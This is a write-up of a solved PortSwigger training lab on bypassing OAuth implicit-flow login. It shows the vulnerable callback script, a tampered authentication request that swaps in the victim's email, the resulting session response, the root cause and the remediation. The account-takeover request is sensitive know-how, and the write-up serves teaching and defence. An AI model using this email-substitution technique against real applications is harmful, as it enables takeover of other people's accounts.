**Platform:** PortSwigger Web Security Academy

https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

**Category:** Authentication — OAuth

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password. Goal is to log in to Carlos’s account

**Difficulty:** Apprentice

**Date Solved:** 2026-08-30

**Severity:** Impact 5.18 + Exploitability 3.89 = **9.1, Critical**

## Summary

The application fails to verify server-side that the authenticated identity in a login request actually belongs to the provided OAuth token, allowing an attacker to log in as any user by modifying the `email` parameter alone — without needing the victim's password or any token belonging to them.

## Affected Component

`POST /authenticate` — client application's session-establishment endpoint,
invoked after the OAuth callback completes

## Steps to Reproduce

## Proof of Concept

The starting line of the request that establishes this is implicit flow (the root enabler) :

```arduino
GET /auth?client_id=<REDACTED>&redirect_uri=https://<REDACTED>.web-security-academy.net/oauth-callback&response_type=token&nonce=-<REDACTED>&scope=openid%20profile%20email HTTP/2
```

The raw response/JS from **`GET /oauth-callback HTTP/2`--**  it's the actual vulnerable code trusting `j.email` without further checks

```arduino
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-<REDACTED>.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

The modified (email swapped) body of `POST /authenticate HTTP/2`

```bash
{"email":"carlos@carlos-montoya.net","username":"wiener","token":"<REDACTED>"}
```

The response — `302`proving the server issued a fresh session for the substituted identity

```bash
HTTP/2 302 Found
Location: /
Set-Cookie: session=<REDACTED>; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

!image.png

## Root Cause

The application fails to verify that the authenticated identity in a request actually corresponds to the provided access token — it assumes the token and the email belong together without checking. Because the implicit grant exposes the token directly to the browser, an attacker can retain a legitimate token of their own while substituting a victim's email, and the server accepts the mismatch.

## Impact

**Technical** 

- Full account takeover, any account, if you know their email
- Attacker never touches victim's password or real OAuth credentials

**Business / Real-World**

- OAuth/SSO is usually marketed as *more* secure than passwords — this breaks that assumption entirely
- attacker only needs a target's email (often public/guessable), nothing secret

**Scope**

- Confined to accounts on this specific app; doesn't cross into the OAuth provider itself or other apps using the same provider

## Remediation

The server must independently verify that the email associated with a session actually belongs to the provided token before establishing a session — for example, by calling the OAuth provider's `/me` endpoint server-side itself, rather than trusting a client-supplied copy of that data. Longer-term, the application should migrate from the implicit grant to the Authorization Code flow with PKCE, which never exposes the token to the browser in the first place.

## Lessons Learned & Patterns

- **Root-cause pattern:** Different vulnerability classes can share the same flaw: **the server trusts a client-controlled value instead of verifying it against an authoritative source.** This appeared in 2FA (`verify`), multi-step authorization (`confirmed`), and OAuth (`email`).
- **Methodology:** **Read client-side JavaScript before guessing parameters.** Following `j.email` showed exactly which identity field reached the server, giving a precise test target.
- **Reporting habit:** Always capture the **untouched baseline request** alongside the modified request. It establishes what the normal flow does and makes the security-relevant change obvious.

### General Takeaway

> **Don't ask only "what can I modify?" Ask "what does the server trust that the client should not be authoritative for?"**
> 

## References

- PortSwigger, "Lab: Authentication bypass via OAuth implicit flow" — https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow
- PortSwigger, "OAuth 2.0 authentication vulnerabilities" — https://portswigger.net/web-security/oauth
- RFC 6749, "The OAuth 2.0 Authorization Framework," Section 4.2 (Implicit Grant) — https://www.rfc-editor.org/rfc/rfc6749#section-4.2
- RFC 9700, "Best Current Practice for OAuth 2.0 Security" (formally deprecates the Implicit grant) — https://www.rfc-editor.org/rfc/rfc9700
- CWE-345: Insufficient Verification of Data Authenticity — https://cwe.mitre.org/data/definitions/345.html

**Tags:** #PortSwigger #IDOR #AccessControl
